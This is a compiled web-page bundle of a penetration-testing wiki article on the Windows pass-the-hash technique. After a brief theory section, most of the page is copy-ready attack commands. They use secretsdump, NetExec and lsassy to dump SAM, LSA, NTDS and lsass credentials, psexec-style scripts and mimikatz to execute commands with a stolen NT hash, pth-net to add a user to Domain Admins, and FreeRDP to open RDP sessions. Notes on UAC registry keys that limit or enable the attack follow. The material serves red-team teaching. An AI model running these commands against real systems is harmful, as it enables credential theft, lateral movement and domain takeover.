import{_ as r,c as o,a5 as l,G as t,w as e,B as n,o as p,j as s,a as i}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"Pass the hash","description":"MITRE ATT&CK™ Sub-technique T1550.002","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1550.002","authors":"ShutdownRepo, mpgn, sckdev"},"headers":[],"relativePath":"ad/movement/ntlm/pth.md","filePath":"ad/movement/ntlm/pth.md","lastUpdated":1724982529000}'),d={name:"ad/movement/ntlm/pth.md"};function c(g,a,F,E,y,u){const h=n("PluginTabsTab"),k=n("PluginTabs");return p(),o("div",null,[a[4]||(a[4]=l('<h1 id="pass-the-hash" tabindex="-1">Pass the hash <a class="header-anchor" href="#pass-the-hash" aria-label="Permalink to &quot;Pass the hash&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>An attacker knowing a user&#39;s NT hash can use it to authenticate over NTLM (pass-the-hash) (or indirectly over Kerberos with <a href="./../kerberos/ptk">overpass-the-hash</a>).</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>There are many tools that implement pass-the-hash: <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noreferrer">Impacket scripts</a> (Python) (<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" target="_blank" rel="noreferrer">psexec</a>, <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py" target="_blank" rel="noreferrer">smbexec</a>, <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noreferrer">secretsdump</a>...), <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noreferrer">NetExec</a> (Python), <a href="https://github.com/FreeRDP/FreeRDP" target="_blank" rel="noreferrer">FreeRDP</a> (C), <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer">mimikatz</a> (C), <a href="https://github.com/Hackndo/lsassy" target="_blank" rel="noreferrer">lsassy</a> (Python), <a href="https://github.com/byt3bl33d3r/pth-toolkit" target="_blank" rel="noreferrer">pth-toolkit</a> (Python) and many more.</p>',5)),t(k,null,{default:e(()=>[t(h,{label:"Credentials dumping"},{default:e(()=>a[0]||(a[0]=[s("p",null,[i("The Impacket script "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",target:"_blank",rel:"noreferrer"},"secretsdump"),i(" (Python) has the ability to remotely dump hashes and LSA secrets from a machine ("),s("code",null,"LMhash"),i(" can be empty) (see "),s("a",{href:"./../credentials/dumping/sam-and-lsa-secrets"},"dumping credentials from registry hives"),i(").")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ':NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER:PASSWORD@TARGET'")])])])],-1),s("p",null,[s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),i(" (Python) has the ability to do it on a set of targets. The "),s("code",null,"bh_owned"),i(' has the ability to set targets as "owned" in '),s("a",{href:"https://github.com/BloodHoundAD/BloodHound",target:"_blank",rel:"noreferrer"},"BloodHound"),i(" (see "),s("a",{href:"./../credentials/dumping/sam-and-lsa-secrets"},"dumping credentials from registry hives"),i(").")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--sam"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --local-auth")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--lsa")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--ntds")])])])],-1),s("p",null,[s("a",{href:"https://github.com/Hackndo/lsassy",target:"_blank",rel:"noreferrer"},"Lsassy"),i(' (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in '),s("a",{href:"https://github.com/BloodHoundAD/BloodHound",target:"_blank",rel:"noreferrer"},"BloodHound"),i(". It works in standalone but also as a "),s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),i(" module (see "),s("a",{href:"./../credentials/dumping/lsass"},"dumping credentials from lsass process memory"),i(").")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-M"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," lsassy")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-M"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," lsassy"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," BLOODHOUND=True"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," NEO4JUSER=neo4j"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," NEO4JPASS=Somepassw0rd")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsassy"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash $TARGETS")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsassy"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash $TARGETS")])])])],-1)])),_:1}),t(h,{label:"Command execution"},{default:e(()=>a[1]||(a[1]=[s("p",null,[i("Some Impacket scripts enable testers to execute commands on target systems with pass-the-hash ("),s("code",null,"LMhash"),i(" can be empty).")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"psexec.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbexec.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"wmiexec.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"atexec.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dcomexec.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")])])])],-1),s("p",null,[s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),i(" (Python) has the ability to do it on a set of targets")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," winrm"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-x"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," whoami")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--local-auth"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-x"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," whoami")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-x"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," whoami")])])])],-1),s("p",null,[i("On Windows, "),s("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"mimikatz"),i(" (C) can pass-the-hash and open an elevated command prompt with "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth",target:"_blank",rel:"noreferrer"},[s("code",null,"sekurlsa::pth")]),i(".")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sekurlsa::pth"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /user:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/domain:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/ntlm:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NThash")])])])],-1)])),_:1}),t(h,{label:"AD operations"},{default:e(()=>a[2]||(a[2]=[s("p",null,[i("The "),s("a",{href:"https://github.com/byt3bl33d3r/pth-toolkit",target:"_blank",rel:"noreferrer"},"pth-toolkit"),i(" (Python) can be used from a Linux system to operate LDAP queries, add a user to a group and so on ("),s("code",null,"LMhash"),i(" can be "),s("code",null,"ffffffffffffffffffffffffffffffff"),i(").")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"pth-net"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," rpc"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," group"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," members"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "Domain admins"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -U"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Domain/User%LMhash:NThash'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -S"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN_CONTROLLER")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"pth-net"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," rpc"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," group"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," addmem"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "Domain admins"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," Shutdown"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -U"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Domain/Admin%LMhash:NThash'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -S"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN_CONTROLLER")])])])],-1)])),_:1}),t(h,{label:"RDP access"},{default:e(()=>a[3]||(a[3]=[s("p",null,[s("a",{href:"https://github.com/FreeRDP/FreeRDP",target:"_blank",rel:"noreferrer"},"FreeRDP"),i(" (C) has the ability to do pass-the-hash for opening RDP sessions.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"xfreerdp"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /u:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/d:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/pth:'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /v:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/h:1010"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /w:1920")])])])],-1)])),_:1})]),_:1}),a[5]||(a[5]=l('<h3 id="limitations-tips-and-tricks" tabindex="-1">Limitations, tips and tricks <a class="header-anchor" href="#limitations-tips-and-tricks" aria-label="Permalink to &quot;Limitations, tips and tricks&quot;">​</a></h3><div class="important custom-block"><p class="custom-block-title">UAC limits pass-the-hash</p><p>UAC (User Account Control) limits which local users can do remote administration operations. And since most of the attacks exploiting pass-the-hash rely on remote admin operations, it affects this technique.</p><ul><li>the registry key <code>LocalAccountTokenFilterPolicy</code> is set to <code>0</code> by default. It means that the built-in local admin account (RID-500, &quot;Administrator&quot;) is the only local account allowed to do remote administration tasks. Setting it to <code>1</code> allows the other local admins as well.</li><li>the registry key <code>FilterAdministratorToken</code> is set to <code>0</code> by default. It allows the built-in local admin account (RID-500, &quot;Administrator&quot;) to do remote administration tasks. If set to <code>1</code>, it doesn&#39;t.</li></ul><p>In short, by default, only the following accounts can fully take advantage of pass-the-hash:</p><ul><li>local accounts : the built-in, RID-500, &quot;Administrator&quot; account</li><li>domain accounts : all domain accounts with local admin rights</li></ul></div><div class="note custom-block"><p class="custom-block-title">WinRM enables pass-the-hash</p><p>Testers should look out for environments with WinRM enabled. During the WinRM configuration, the <code>Enable-PSRemoting</code> sets the <code>LocalAccountTokenFilterPolicy</code> to <code>1</code>, allowing all local accounts with admin privileges to do remote admin tasks, hence allowing those accounts to fully take advantage of pass-the-hash.</p></div><div class="tip custom-block"><p class="custom-block-title">Machine accounts</p><p>Just like with any other domain account, a machine account&#39;s NT hash can be used with pass-the-hash, but it is not possible to operate remote operations that require local admin rights (such as <a href="./../credentials/dumping/sam-and-lsa-secrets">SAM &amp; LSA secrets dump</a>). These operations can instead be conducted after crafting a <a href="./../kerberos/forged-tickets/#silver-ticket">Silver Ticket</a> or doing <a href="./../kerberos/delegations/s4u2self-abuse">S4U2self abuse</a>, since the machine accounts validates Kerberos tickets used to authenticate to a said computer/service.</p><p>A domain controller machine account&#39;s NT hash can be used with pass-the-hash to <a href="./../credentials/dumping/ntds">dump the domain hashes (NTDS.dit)</a>.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://en.hackndo.com/pass-the-hash/" target="_blank" rel="noreferrer">https://en.hackndo.com/pass-the-hash/</a></p><p><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noreferrer">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a></p>',7))])}const b=r(d,[["render",c]]);export{C as __pageData,b as default};
